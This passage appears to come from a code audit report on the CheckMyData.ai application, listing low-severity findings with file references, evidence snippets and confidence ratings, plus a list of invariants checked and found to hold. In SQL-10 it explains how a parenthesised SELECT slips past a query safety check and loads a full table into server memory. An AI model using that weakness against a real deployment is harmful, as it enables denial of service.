            result = await agent.run_scan(db, project_id, conn_id)
            ...
        except Exception as exc:
            logger.warning("Scan failed for connection %s: %s", conn_id, exc)
    await db.commit()
    return {..., "connections_scanned": len(connection_ids)}
```
- **Severity**: low — no data is corrupted, but the endpoint cannot report its own failure and the caller has no way to learn of it.
- **Confidence**: certain.

---

## API-13 — `API.md`'s rate-limiting paragraph names five throttled endpoints as unthrottled and states a route count that is 7 low

*`API` — HTTP routes and contracts*

- **Where**: `API.md:632-640`
- **What is wrong**: The paragraph reads *"112 of 120 mutations; the 8 unthrottled exceptions include `POST /api/checkout`, `POST /api/portal`, `PATCH /api/schedules/{id}`, `POST /api/chat/ws-ticket`, `POST /api/data-validation/investigate/{id}/confirm-fix`, `POST /api/auth/logout`, `POST /api/auth/complete-onboarding`, and the Stripe `POST /api/webhook`"*. Measured against the tree: **127** mutating routes, **124** carrying `@limiter.limit`, **3** without. Five of the eight named exceptions now carry limiters — `billing.py:95` (`10/minute`), `billing.py:119` (`10/minute`), `schedules.py:168`, `chat.py:1443`, `data_investigations.py:241`. The paragraph also gives the billing paths as `/api/checkout` and `/api/webhook`, whereas the router declares `prefix="/billing"` (`billing.py:25`), making them `/api/billing/checkout` and `/api/billing/webhook`.
- **Concrete failure**: A reader planning capacity or a security review takes the document at its word and treats `POST /api/billing/checkout` as unthrottled — the opposite of the truth — and tries to reach `/api/checkout`, which is a 404.
- **Evidence** — AST walk over `backend/app/api/routes/*.py` counting `@router.{post,put,patch,delete}` decorators against the presence of a `limiter.limit` decorator on the same function:
```
total mutating routes: 127
without @limiter.limit: 3
  auth.py:366    POST /logout
  auth.py:414    POST /complete-onboarding
  billing.py:189 POST /webhook
```
- **Severity**: low — documentation drift in the safe direction, but it names specific endpoints wrongly and its paths do not resolve.
- **Confidence**: certain.

---

## AUTH-08 — `update_member_role` writes the role without validating it; the F-PROJ-07 guard was applied to only one of the two writers

*`AUTH` — Authentication, tenancy, access control*

- **Where**: `backend/app/services/membership_service.py:221` (in `update_member_role`, defined at `:200`)
- **What is wrong**: `_require_valid_role` exists precisely because `ROLE_HIERARCHY.get(x, 0)` ranks an unknown role at 0, below every real role — the reasoning is spelled out at `:19-25` and `:135-137`. `add_member` calls it (`:143`); `update_member_role` assigns `member.role = new_role` with no check at all. The service is the layer that documents this invariant, and the only thing currently enforcing it is a Pydantic `Literal` in one route (`invites.py:32,59`), i.e. the shape of one caller rather than the rule.
- **Concrete failure**: Today the sole caller is `PATCH /api/invites/{project_id}/members/{member_user_id}` whose schema is `Literal["editor","viewer"]`, so it is not reachable over HTTP. The moment a second caller appears — an admin tool, a bulk import, an MCP tool, a test fixture — passing `"Editor"` or `"admin"` stores a role that `require_role` cannot rank; `:106-118` then denies that member every route in the project and logs a warning nobody is watching. The mirror-image risk is `"owner"`, which `update_member_role` would happily write, creating a second owner and bypassing the plan-quota enforcement that `transfer_ownership` exists to apply (`:295-297`).
- **Evidence**:
```python
# app/services/membership_service.py:217-224
        if member.role == "owner":
            raise HTTPException(status_code=400, detail="Cannot change the owner's role")
        member.role = new_role          # <- no _require_valid_role, no ASSIGNABLE_ROLES check
        await db.commit()
        await db.refresh(member, attribute_names=["user"])
        return member
```
```python
# app/services/membership_service.py:143  — the same class of write, guarded
        _require_valid_role(role, what="Member role")
```
- **Severity**: low — not currently reachable with a bad value; it is a missing invariant in the layer that claims to own it, with a documented lockout as the failure mode.
- **Confidence**: certain.

---

## BIZ-15 — The Privacy Policy describes an architecture that is not the deployed one: SQLite/ChromaDB "local-first", and an auth token in localStorage

*`BIZ` — Business logic vs stated promises*

- **The promise**: `frontend/src/app/(marketing)/privacy/page.tsx:221-227` — *"CheckMyData.ai follows a **local-first architecture**: Internal application data is stored in **SQLite** (for structured data) and **ChromaDB** (for vector embeddings), both running alongside the application"*. And `:386-392`, §9 Cookies: *"**Authentication token** — stored in your browser's **local storage** to keep you signed in across sessions"*, followed by *"We do **not** use third-party cookies, advertising cookies, or tracking cookies of any kind."*
- **Where the code differs**: `backend/app/config.py:239`; `frontend/src/lib/api/_client.ts:116-122`
- **What is wrong**: The hosted deployment runs Supabase PostgreSQL with pgvector (`VECTOR_STORE_BACKEND` resolves to `pgvector` on a Postgres `DATABASE_URL`), not SQLite and ChromaDB — which matters directly to §11 *International Data Transfers*, where a reader is told to reason about "the country where our servers are located". And browser auth has not used localStorage since T-SEC-3: `auth_cookie_enabled: bool = True` and the client comment reads *"the legacy localStorage bearer fallback has been removed."* The actual mechanism — first-party httpOnly session + CSRF cookies — is not mentioned anywhere in the Cookies section. The deployed posture is *better* than documented; the document is nonetheless wrong on both counts, on a page whose §7 tells the reader every claim on it is verifiable from source.
- **Concrete failure**: A reader performing exactly the audit §7 invites — open the code, confirm the policy — finds the two storage claims false on the first two checks, and has no basis left for trusting the ones they cannot easily verify.
- **Evidence**:
```tsx
// frontend/src/lib/api/_client.ts:116-122
        credentials: "include",
        headers: {
          // Auth rides exclusively on the httpOnly session cookie (T-SEC-3);
          // the legacy localStorage bearer fallback has been removed.
```
```python
# backend/app/config.py:239
    auth_cookie_enabled: bool = True
```
- **Severity**: **low** — no user harm; the risk is to the credibility the page spends two sections building.
- **Confidence**: certain for the auth mechanism. For the storage engine, certain that the code supports Postgres/pgvector and selects it by `DATABASE_URL`; `needs-verification` only that production's `DATABASE_URL` is the Supabase one, which `heroku config:get DATABASE_URL | cut -c1-20` settles.

---

## Checked and holds

- **Invariant 1, read-only by default** — `Connection.is_read_only` defaults `True` at the model (`models/connection.py:92`), the create schema (`connections.py:395`) and the onboarding wizard (`OnboardingWizard.tsx:146`); MCP `execute_raw_query` refuses a non-read-only connection outright (`mcp_server/tools.py:553`).
- **Invariant 2, credentials never exposed** — `ConnectionResponse` (`connections.py:520-570`) carries `db_user` but no password field; SSH private keys and `LlmCredit.key_encrypted` appear in no response model.
- **Invariant 7, freshness tracked and surfaced** — `staleness_warning` reaches the user, not just the prompt: rendered at `ChatMessage.tsx:328-330` and folded into the verified/inferred seal at `ui/Seal.tsx:90`.
- **Cross-connection *learnings* are genuinely gated** — `cross_connection_learnings_enabled: bool = False` (`config.py:826`), single consumer at `agent_learning_service.py:1101`; the global-pattern promotion sits inside that branch. (Insights are the leak — BIZ-05.)
- **All 153 scenario `Coverage:` file paths resolve** — a script over every path token in every `Coverage:` line found 0 dangling files. (Line *ranges* are a different matter — BIZ-14.)
- **The 500-row cap is real and configurable in one place** — `chat_raw_result_row_cap: int = 500` (`config.py:441`), applied through `_build_raw_result` (`chat.py:247-251`).
- **The 14-day trial is actually configured on Stripe** — `subscription_data["trial_period_days"] = plan.trial_days` (`billing_service.py:230-231`) for all four tiers. (The *tier names* in the FAQ are wrong — BIZ-09.)
- **Duplicate-subscription guard fires before the charge** — `billing_service.py:205-211`, with `trialing` counted as live.
- **The open-source claim is true** — `api.github.com/repos/CheckMyData-AI/checkmydata-ai` reports `"private": false`, and `git ls-remote origin refs/heads/main` matches local `HEAD` exactly, so the public repository is the deployed code.
- **`vision.md` §8 "not a BI dashboard tool"** — dashboards remain a sharing surface (`/dashboard/[id]` viewer + `dashboards` routes); the primary interaction is still the chat panel. No drift found.

---

## DATA-11 — `ix_code_graph_symbols_cluster` exists in the migrations and in no model, so it is absent from every `create_all` schema

*`DATA` — Data model and migrations*

- **Where**: `backend/alembic/versions/e9f0a1b2c3d4_add_code_clusters_table.py:50`; `backend/app/models/code_graph.py:32-41` (the `__table_args__` that should carry it)
- **What is wrong**: the clustering migration adds `ix_code_graph_symbols_cluster` on `(project_id, cluster_id)` with `batch_op.create_index`, and `CodeGraphSymbol.__table_args__` declares four indexes, none of them this one. The model is the only description of the table the test suite and the `create_all` fallback ever read.
- **Concrete failure**: the index is the access path for `get_tables_in_cluster` and for every "which symbols are in this cluster" lookup, and it does not exist in the integration-test database at all — so no test can distinguish an indexed lookup from a full scan of `code_graph_symbols` (25 695 rows on the production project). In the other direction, an autogenerate run proposes `op.drop_index("ix_code_graph_symbols_cluster")`, because from the model's point of view the index is unexplained.
- **Evidence**:

```
alembic/…/e9f0a1b2c3d4.py:50   batch_op.create_index("ix_code_graph_symbols_cluster", ["project_id", "cluster_id"])

app/models/code_graph.py:32-41  __table_args__ = (
        Index("ix_code_graph_symbols_project", "project_id"),
        Index("ix_code_graph_symbols_project_name", "project_id", "name"),
        Index("ix_code_graph_symbols_project_file", "project_id", "file_path"),
        Index("ix_code_graph_symbols_uid", "uid"),
    )
```
  Reflected from the migration-built database, the diff reports it as `INDEXES in db, NOT in model: [('ix_code_graph_symbols_cluster', (('project_id', 'cluster_id'), False))]` — the only index in the whole schema in that category.
- **Severity**: low — `clustering_enabled` is off by default, so `cluster_id` is currently all-NULL and nothing depends on the index yet. It becomes a real gap the day clustering is turned on.
- **Confidence**: certain.

---

## FE-10 — The MCP token list paints two states in raw Tailwind palette colours that do not follow the theme

*`FE` — Frontend and interface states*

- **Where**: `frontend/src/components/mcp/McpTokenManager.tsx:30` and `:194`
- **What is wrong**: `text-emerald-400` marks a token "active" and `hover:text-rose-400` marks the Revoke action, where the design system requires the semantic tokens (`text-success` / `text-ok`, `text-danger`). Tailwind's default palette is still registered (globals.css uses `@theme inline` and never resets `--color-*`), so the classes compile — which is why nothing failed — but they are fixed hexes: they do not change between the light and dark twins the pack ships, and they are the only two such classes left in `components/`.
- **Concrete failure**: In light mode the "active" label renders in the same mid-emerald as in dark mode, against a cream field where the pack's `--ok` would sit several steps darker. The only two status colours on the screen are the two that ignore the theme.
- **Evidence**:
  ```bash
  $ grep -rnE '\b(bg|text|border|…)-(slate|…|emerald|…|rose)-(50|…|950)\b' src --include='*.tsx'
  src/components/mcp/McpTokenManager.tsx:30:  return { label: "active", tone: "text-emerald-400" };
  src/components/mcp/McpTokenManager.tsx:194:  className="text-meta text-text-tertiary hover:text-rose-400 transition-colors"
  ```
  Against `DESIGN_SYSTEM.md:661` — *"No outstanding raw-palette migrations remain in the shared component layer"* — and `:682` — *"Never introduce a new raw Tailwind color class when a semantic token exists."* `pack-bans.test.ts` checks accent fills, gradients, chart literals, font sizes, radii, focus rings, shadows, selects and `bg-black`/`bg-white`; it does not check the numbered palette, which is why these two survived.
- **Severity**: low — cosmetic, confined to one admin panel, but it falsifies a claim the design document makes about itself.
- **Confidence**: certain.

---

## FE-11 — The readiness cache records when it was checked and nothing ever reads it

*`FE` — Frontend and interface states*

- **Where**: `frontend/src/stores/app-store.ts:100-103`, written at `frontend/src/components/chat/ReadinessGate.tsx:72` and `:114`, consumed at `frontend/src/components/chat/ChatPanel.tsx:76-78`
- **What is wrong**: `ReadinessCacheEntry` carries `{ ready, checkedAt }`. `checkedAt` is written twice and read nowhere, so the cache has no TTL: once `ready: true` is recorded for a project, `showReadinessGate` (`ChatPanel.tsx:751`) is false for the rest of the document's life. Invalidation is entirely event-driven (`clearReadinessCache` on pipeline completion and on the index/sync poll endings), so any state change that arrives by no event is never noticed.
- **Concrete failure**: A user opens a ready project — readiness cached. In another tab, or by another member of the workspace, the project's only connection is deleted. Back in the first tab the gate never re-appears; the chat presents itself as ready to query a source that no longer exists, and the first question fails at the agent instead of at the gate that exists to prevent it.
- **Evidence**:
  ```bash
  $ grep -rn "checkedAt" src --include='*.ts' --include='*.tsx' | grep -v __tests__
  src/stores/app-store.ts:102:  checkedAt: number;
  src/components/chat/ReadinessGate.tsx:72:        checkedAt: Date.now(),
  src/components/chat/ReadinessGate.tsx:114:          checkedAt: Date.now(),
  ```
- **Severity**: low — degrades a nudge, not a guarantee; the failure is recoverable and self-explaining once the query runs.
- **Confidence**: certain that the field is unread; needs-verification on how often the cross-tab scenario occurs in practice.

---

## OPS-14 — `TracePersistenceService` has no cross-process-echo guard, so it buffers every worker workflow in the web dyno and force-drops it after 300 s

*`OPS` — Background work, observability, deploy*

- **Where**: `backend/app/services/trace_persistence_service.py:163-187` and `:25`, `:543-559`, against `backend/app/services/run_coordinator.py:487-489` and `backend/app/core/workflow_tracker.py:401-419`, `:480-484`
- **What is wrong**: `_deliver_local` runs **every** persistence hook, including on the Redis rebroadcast path (`workflow_tracker.py:480`). `RunCoordinator._on_event` guards against this explicitly (`if tracker._external_rebroadcast: return`). `TracePersistenceService._on_event` has no such guard, so every `pipeline_start` a worker publishes creates a `_WorkflowBuffer` in the web process, and every subsequent event is appended to it. `_STALE_BUFFER_SECONDS` is 300, while a repo index runs for hours — so `_cleanup_stale_buffers` pops the buffer, synthesises a `pipeline_end` with `status="failed"` and detail `"Stale: pipeline_end never received"`, and discards it. Every later event for that workflow is then dropped at `:176-177`.
- **Concrete failure**: a 3.3-hour `index_repo` publishes ~40 step events into the web dyno's buffer for 5 minutes; at 300 s the buffer is force-flushed as a failed workflow and every subsequent event for those three hours is silently discarded. The one thing that saves it from writing a false `failed` row into `request_traces` and `error_log` is the early return at `:474-485`, because `RunCoordinator.start` puts no `user_id` in the workflow context — an accidental guard, not a designed one. A chat workflow exceeding 300 s does carry a `user_id` and does get the false `failed` trace plus an `ErrorLogService.upsert_from_trace` row (`:523-529`).
- **Evidence**:
```python
# trace_persistence_service.py — no _external_rebroadcast check anywhere
163	    async def _on_event(self, event: WorkflowEvent) -> None:
165	        try:
166	            async with self._lock:
167	                if event.step == "pipeline_start":
168	                    self._buffers[event.workflow_id] = _WorkflowBuffer(…)
```
```python
# run_coordinator.py:487-489 — the guard the other hook has
        # Guard 2: cross-process echo (Redis -> API). …
        if tracker._external_rebroadcast:
            return
```
- **Severity**: low — no false row is written for background runs today, but only because of an unrelated early return; the wasted buffering and the dropped chat traces are real, and the protection is one added `user_id` away from disappearing.
- **Confidence**: certain for the missing guard and the 300 s flush. What would settle the impact: `SELECT count(*) FROM request_traces WHERE error_message LIKE 'Stale:%'` on production.

---

## SQL-10 — A parenthesised SELECT skips the Postgres server-side cursor and materialises the whole result set in memory

*`SQL` — Connectors, SQL safety, SSH*

- **Where**: `backend/app/connectors/postgres.py:173` / `:193`, helper `_is_row_returning` at `:570-586` with `_ROW_RETURNING_RE` at `:564-567`
- **What is wrong**: `_ROW_RETURNING_RE` anchors on `^\s*(?:WITH|SELECT|VALUES|TABLE|SHOW|EXPLAIN)` after stripping leading comments. `SafetyGuard`'s own leading-token regex (`safety.py:53`, `^[\s(]*([A-Za-z]+)`) deliberately allows a leading open-paren, so the two disagree about the same string. When they disagree the query falls to `return await conn.fetch(numbered_query, *values), []` — the non-cursor branch, whose comment says it is for "non-row-returning statements (DDL/DML)". `conn.fetch` materialises everything before `MAX_RESULT_ROWS` or `cap_rows_by_bytes` ever run, so both caps are applied to a list that is already in the heap. `MAX_RESULT_BYTES` cannot help for the same reason.
- **Concrete failure**: `(SELECT * FROM events)` — accepted by `SafetyGuard` (verified: leading token resolves to `SELECT`), rejected by `_is_row_returning`, executed via `conn.fetch`, and the full table lands in the web dyno's memory. On a 1 GiB worker this is the R15 class of failure the streaming path was introduced to end. The `+1` sentinel is also unavailable on that branch, so `truncated` is computed from a complete set rather than detected.
- **Evidence**:
  ```python
  # postgres.py:173,193
  if _is_row_returning(numbered_query):
      ...  # cursor, capped at MAX_RESULT_ROWS + 1
  return await conn.fetch(numbered_query, *values), []   # entire result set
  # safety.py:51-53
  # "leading whitespace and an opening paren are both valid statement starts"
  _LEADING_TOKEN = re.compile(r"^[\s(]*([A-Za-z]+)")
  ```
- **Severity**: **low** — real but narrow; an LLM rarely emits a parenthesised top-level SELECT, so the realistic reach is a deliberate MCP/notes query.
- **Confidence**: certain. Making `_is_row_returning` skip leading `(` the way `_LEADING_TOKEN` does closes it.

---

## TEST-12 — the scenario anchor count credits the wrong scenario for a suffixed id

*`TEST` — Tests, CI gates, UX scenarios*

- **Where**: `/Users/sshlg/DATA/checkmydata-ai/scripts/ux_verification_status.py:71` (`git grep -noE "SCN-[0-9]+"`), against the row regex at `:52` which accepts `SCN-\d+[a-z]?`
- **What is wrong**: The row parser was widened to accept a lowercase suffix (`SCN-101a`) after that row was found invisible to every count; `anchored_ids()` two functions below was not. A code reference to `SCN-101a` is captured by the grep as `SCN-101`, so the intersection at `:110` credits the anchor to a **different scenario** and leaves the suffixed one reported as having no anchor a machine could check it by. `audit_backlog`'s `stale_ids` regex at `:196` has the same omission, so a suffixed scenario never appears in the re-audit backlog either.
- **Concrete failure**: Write `# SCN-101a: an unpaid account is refused scheduled work` in a new test. `SCN-101` ("Billing disabled (self-hosted) degradation", `docs/ux/scenarios.md:145`) is counted as anchored and SCN-101a (`:146`) is counted as unanchored — the block's "Referenced from code or tests: 33 of 153" figure becomes wrong in two directions at once, and `test_the_block_agrees_with_the_table_it_summarises` cannot see it because it regenerates with the same buggy function.
- **Evidence**:
```
scripts/ux_verification_status.py:52: _ROW = re.compile(r"^\|\s*(SCN-\d+[a-z]?)\s*\|…")
scripts/ux_verification_status.py:71:  ["git","grep","-noE","SCN-[0-9]+","--","*.py","*.ts","*.tsx"]
docs/ux/scenarios.md:145: | SCN-101  | Billing disabled (self-hosted) degradation | … |
docs/ux/scenarios.md:146: | SCN-101a | Billing on, no subscription (unpaid account) | … |
```
  Currently latent: the only two files naming `SCN-101a` are both in `_NOT_AN_ANCHOR` (`:64-67`).
- **Severity**: low — latent today, wrong the first time a suffixed scenario gets a test.
- **Confidence**: certain.

---

## TEST-14 — 166 `file:line` citations in the scenario base are unchecked, and the project's own audit data says they rot far faster than the claims do

*`TEST` — Tests, CI gates, UX scenarios*

- **Where**: `/Users/sshlg/DATA/checkmydata-ai/backend/tests/unit/docs/test_ux_scenarios.py:66` (`_PATH_RE`, extension only) and `:143-158` (`_unresolved_paths`, existence only); the untracked count claim is at `/Users/sshlg/DATA/checkmydata-ai/CLAUDE.md:1036`
- **What is wrong**: `_PATH_RE` captures the path token and stops before `:1511-1523`, so the line anchors are never parsed and never validated. `test_ux_scenarios.py:263-289` records that three re-audit batches of five scenarios each found **15 of 15 behaviourally correct and 22 stale citations** — i.e. the citations are the part that decays, and they are the part with no check. Only the coarsest form of rot (a line number past EOF) is even detectable, and one such reference already exists. Separately, `CLAUDE.md:1036` states "151 scenarios; 128 `implemented`, 23 `draft`" while the generated block in `scenarios.md` counts 153 / 141 / 12, and nothing compares the two.
- **Concrete failure**: A file grows by 400 lines (the file's own docstring cites `OnboardingWizard.tsx:209` moving to `:584`); every `Coverage:` line naming it now points at unrelated code while reading as evidence. The suite is green throughout, and `make ux-status` reports nothing because it only counts dates and anchors.
- **Evidence**:
```
$ python3 <scan of every "path:line" in scenarios.md Coverage lines>
line-anchored Coverage references checked: 166
references pointing past end of file: 1
   SCN-016  components/Sidebar.tsx:749   (file has 651 lines)
$ python3 scripts/ux_verification_status.py | grep -E "Scenarios|Status"
| Scenarios | **153** |
| Status | draft × 12, implemented × 141 |
CLAUDE.md:1036:  `scenarios.md` covers the whole product (151 scenarios; 128 `implemented`, 23 `draft`)
```
- **Severity**: low — documentation fidelity rather than product behaviour, but it is the layer `super-ux` declares the source of truth.
- **Confidence**: certain.

---
